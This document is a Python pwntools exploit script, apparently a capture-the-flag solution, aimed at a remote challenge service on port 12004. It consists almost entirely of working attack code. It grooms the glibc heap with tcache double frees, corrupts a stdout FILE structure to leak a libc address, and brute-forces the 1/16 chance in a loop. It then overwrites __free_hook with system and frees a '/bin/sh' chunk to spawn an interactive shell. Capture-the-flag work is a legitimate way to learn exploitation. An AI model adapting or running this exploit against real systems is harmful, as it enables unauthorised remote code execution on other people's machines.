from pwn import *

# TARGET = './target'
HOST = 'challs.xmas.htsp.ro'
PORT = 12004

# elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


def alloc(idx, size, text): 
    r.sendline('1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', text)
    return r.recvuntil('> ') 

def delete(idx):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.recvuntil('> ') 
    
def realloc(idx, size, text):
    r.sendline('1337')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', text)
    r.recvuntil('> ') 

def exploit(r):
    # if args.D:
        # debug(r, [])


    alloc(0, 0x18, p64(0x21)*3)
    alloc(1, 0x28, p64(0x21)*3)
    alloc(2, 0x38, p64(0x21)*3)
    alloc(3, 0x1f8, 'A')
    alloc(4, 0x1f8, 'A')
    alloc(5, 0x58, p64(0x21)*11)
    delete(0)
    delete(0)
    delete(1)
    delete(1)
    delete(2)
    delete(2)
    delete(3)
    alloc(0, 0x18, '\xe0') # 0
    alloc(1, 0x18, p64(0x21)*3) # 1
    alloc(2, 0x18, p64(0)+p64(0x421))# 2
    delete(3)
    alloc(3, 0x28, '\xe0') # 3
    alloc(6, 0x28, 'A') # 6
    alloc(7, 0x28, p64(0)+p64(0x201)+'\x60\x67') # 7

    alloc(8, 0x1f8, 'A') # 8
    payload = ''
    payload += p64(0xfbad1800)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += '\x00'
    text = alloc(9, 0x1f8, payload) # 9
    print text[8:16]
    if 'Space' in text[8:16]:
        r.close()
        return -1
    context.log_level = 'debug'
    log.info("1/16 hit")
    leak = u64(text[8:16])
    base = leak - 0x3ed8b0
    print "LIBC BASE:", hex(base)
    fh = base + 0x3ed8e8
    system = base + 0x4f440
    delete(1)
    delete(6)
    delete(8)
    alloc(1, 0x38, p64(fh))
    alloc(6, 0x38, "/bin/sh\x00")
    alloc(8, 0x38, p64(system))
    r.sendline('2')
    r.sendlineafter(': ', '6')

    r.interactive()
    return 0
    
while(1):
    r = start()
    try:
        ret = exploit(r)
        if ret == 0:
            break
    except:
        pass
    context.log_level = 'info'
    r.close()

